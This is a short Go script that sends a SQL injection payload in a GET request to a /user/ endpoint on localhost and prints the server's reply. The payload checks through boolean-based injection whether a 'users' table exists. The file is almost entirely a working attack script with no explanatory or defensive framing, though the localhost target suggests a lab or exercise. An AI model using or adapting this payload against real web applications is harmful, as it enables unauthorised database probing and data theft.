package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

func main() {
	table := "users"
	method := "GET"
	base_url := "http://localhost:5000/user/"
	payload := fmt.Sprintf(`a' OR (SELECT COUNT(1) FROM %s) NOT LIKE 0-- -/`, table)
	encoded_payload := strings.ReplaceAll(payload, " ", "%20")
	url := base_url + encoded_payload
	println(url)
	req, err := http.NewRequest(method, url, strings.NewReader(""))

	// Do not follow redirects
	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	if err != nil {
		fmt.Println(err)
	}

	resp, err := client.Do(req)

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	fmt.Println(bodyString)
}
